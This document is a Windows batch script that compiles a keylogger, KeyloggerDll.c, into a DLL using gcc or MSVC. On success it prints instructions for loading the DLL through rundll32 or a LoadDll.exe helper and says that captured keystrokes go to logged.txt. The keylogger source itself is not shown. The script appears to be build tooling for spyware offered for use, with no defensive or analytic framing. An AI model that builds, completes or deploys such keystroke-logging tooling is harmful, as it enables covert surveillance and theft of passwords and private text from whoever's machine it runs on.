@echo off
echo Compiling KeyloggerDll.c to KeyloggerDll.dll...
echo.

REM Try MinGW gcc first (most common for standalone installs)
where gcc >nul 2>&1
if not errorlevel 1 (
    echo Using: gcc (MinGW^)
    gcc -shared -o KeyloggerDll.dll KeyloggerDll.c -luser32
    if errorlevel 1 (
        echo [!] gcc compilation failed.
        pause
        exit /b 1
    )
    goto :success
)

REM Try MSVC cl.exe
where cl >nul 2>&1
if not errorlevel 1 (
    echo Using: cl.exe (MSVC^)
    cl /LD /O2 KeyloggerDll.c user32.lib /Fe:KeyloggerDll.dll
    if errorlevel 1 (
        echo [!] cl compilation failed.
        pause
        exit /b 1
    )
    REM Clean up MSVC intermediates
    if exist KeyloggerDll.obj del KeyloggerDll.obj
    if exist KeyloggerDll.lib del KeyloggerDll.lib
    if exist KeyloggerDll.exp del KeyloggerDll.exp
    goto :success
)

echo [!] No C compiler found.
echo [!] Install MinGW-w64 (gcc) or Visual Studio Build Tools (cl).
echo.
echo Quick install options:
echo   - MinGW: winget install -e --id MingW-w64.MingW-w64
echo   - MSVC:  winget install -e --id Microsoft.VisualStudio.2022.BuildTools
pause
exit /b 1

:success
echo.
echo [*] Success! KeyloggerDll.dll created
echo [*] Load it with: rundll32 KeyloggerDll.dll,DllMain
echo [*] Or use: LoadDll.exe KeyloggerDll.dll
echo [*] Keystrokes will be saved to logged.txt
echo.
pause